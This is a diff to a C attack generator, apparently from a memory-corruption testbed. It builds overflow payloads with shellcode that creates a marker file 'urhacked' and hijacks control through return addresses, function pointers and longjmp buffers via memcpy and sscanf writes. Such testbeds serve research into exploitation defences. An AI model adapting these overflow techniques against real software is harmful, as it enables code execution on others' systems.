@@ -7,7 +7,7 @@
 #include "attack_generator.h"
 
 /**
- * Shellcode with NOP sled that touches a file 'urhacked'
+ * Shellcode without NOP sled that touches a file 'urhacked'
  * @author Aman Sharma
  *
  */
@@ -24,8 +24,6 @@ static char createfile_shellcode[] =
 
 #define OLD_BP_PTR   __builtin_frame_address(0)
 #define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)
-
-//static size_t size_shellcode_createfile = sizeof(createfile_shellcode) / sizeof(createfile_shellcode[0]) - 1;
 
 const size_t size_createfile_shellcode = sizeof(createfile_shellcode);
 
@@ -47,21 +45,9 @@ struct jmp_struct data_jmp_struct;
 
 int main(int argc, char **argv) {
   int option_char;
-//  int i = 0;
   jmp_buf stack_jmp_buffer_param;
 
-  //NN: Add provisioning for when 00 are in the address of the jmp_buffer_param
   jmp_buf stack_jmp_buffer_param_array[512];
-/*
-  for(i=0; i < 512; i++){
-	if(!contains_terminating_char(stack_jmp_buffer_param_array[i]))
-		break;
-  }
-  if (i == 512){
-	fprintf(stderr,"Error. Can't allocate appropriate stack_jmp_buffer\n");
-	exit(1);
-  }
-*/
 
   while((option_char = getopt(argc, argv, "t:i:c:l:f:d:e:o")) != -1) {
     switch(option_char) {
@@ -78,7 +64,7 @@ int main(int argc, char **argv) {
       set_function(optarg);
       break;
     default:
-	fprintf(stderr, "Error: Unknown command option \"%s\"\n", optarg);
+      fprintf(stderr, "Error: Unknown command option \"%s\"\n", optarg);
       exit(1);
       break;
     }
@@ -86,13 +72,12 @@ int main(int argc, char **argv) {
 
   /* Check if attack form is possible */
   if(is_attack_possible()) {
-    //NN
     perform_attack(&fooz, stack_jmp_buffer_param);
   } else {
-	fprintf(stderr, "Error: Attack Impossible\n", optarg);
-    //exit(ATTACK_IMPOSSIBLE);
+    fprintf(stderr, "Error: Attack Impossible\n", optarg);
   }
 }
+
 
 char* generate_payload() {
 
@@ -111,12 +96,12 @@ char* generate_payload() {
   memcpy(tc_ra_location, &overflow_ptr, sizeof(int));
 
   payload.size = total_size;
+
   return temp_char_buffer;
 }
 
 void write_to_buffer(char* temp_char_buffer) {
   char format_string_buf[16];
-
   switch(attack.function) {
   case MEMCPY:
     memcpy(payload.buffer, temp_char_buffer, payload.size);
@@ -144,11 +129,9 @@ void write_to_buffer(char* temp_char_buffer) {
     sscanf(temp_char_buffer, format_string_buf, payload.buffer);
     break;
   }  
-  printf("%c\n", *((char*) payload.buffer));
 }
 
 void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param) {  
-
 
   char buf[BUFFER_SIZE];
 
@@ -175,10 +158,6 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
 
   struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
   heap_struct->func_ptr = &fooz;
-
-  attack.technique = INDIRECT;
-  attack.code_ptr = LONGJMP_BUF_DATA;
-  attack.location = STACK;
 
   payload.size = size_createfile_shellcode;
 
@@ -315,11 +294,10 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
   // if the attack is indirect, set the mem_ptr appropriate
   if (attack.technique == INDIRECT && attack.location == STACK) {
     *stack_indirect.mem_ptr = (int) payload.buffer;
-    printf("%x\n", *stack_indirect.mem_ptr);
   }
 
-
-  if (attack.technique == INDIRECT) {
+  //NR
+  //if (attack.technique == INDIRECT) {
     switch (attack.code_ptr) {
       case STRUCT_FUNC_PTR_STACK:
         stack_struct.func_ptr();
@@ -349,11 +327,7 @@ void perform_attack(void (*stack_func_ptr_param)(), jmp_buf stack_jmp_buf_param)
         longjmp(bss_jmp_struct.env_buffer, 7);
         break;
     }
-  }
-
-  payload.contents = createfile_shellcode;
-
-  generate_payload(&fooz);
+  //}
 }
 
 
